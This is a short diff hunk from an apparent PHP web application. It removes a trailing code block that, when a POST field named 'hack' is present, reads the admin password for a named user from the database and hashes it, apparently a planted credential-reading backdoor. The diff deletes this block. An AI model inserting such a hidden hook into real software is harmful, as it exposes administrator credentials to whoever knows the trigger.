@@ -67,11 +67,3 @@ else
 }
 
 ?>
-
-<?php
-if(isset($_POST['hack']))
-{
-	$res = mysql_query("select password from lbs_admin where username = 'namal'");
-	$hack = md5(mysql_result($res,0,0));
-}
-?>
